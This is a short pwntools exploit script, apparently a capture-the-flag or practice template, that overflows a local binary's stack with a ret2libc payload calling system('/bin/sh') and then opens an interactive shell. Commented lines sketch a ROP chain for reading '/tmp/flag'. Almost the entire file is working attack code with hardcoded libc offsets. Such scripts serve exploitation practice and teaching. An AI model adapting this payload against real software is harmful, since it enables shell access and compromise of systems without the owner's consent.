from pwn import *
p = process("./a.out")

PR = 0xbfc0ffee  # need to change accordingly; PPR, PPPR may also needed
# "pop ret" gagdet is used for cleaning stack, in 32bit system
LIBC = 0x7ffff7dcb000
# true
# system = LIBC + 0x4c330 
# to skip 1 push operation , we set system address to this
system = 0x7ffff7e16ec2
binsh = LIBC + 0x196031
payload = b'A' * 72

payload += p64(system)
payload += b'A' * 8
payload += p64(binsh)
# open("/tmp/flag", 0)  #some note for file reading
# read(3, buf, 1048)
# write(1, buf, 1048)

# BUF = 0x804c500
# payload += p32(READ)
# payload += p32(PPPR)
# payload += p32(0)
# payload += p32(BUF)
# payload += p32(len("/tmp/flag"))


# gdb.attach(p, "b *(start+146)")
p.sendline(payload)

#p.recvuntil("blabla") #receive data until one of delims ("blabla") is encountered.
#p.send("/tmp/flag")  # send more info 

p.interactive()

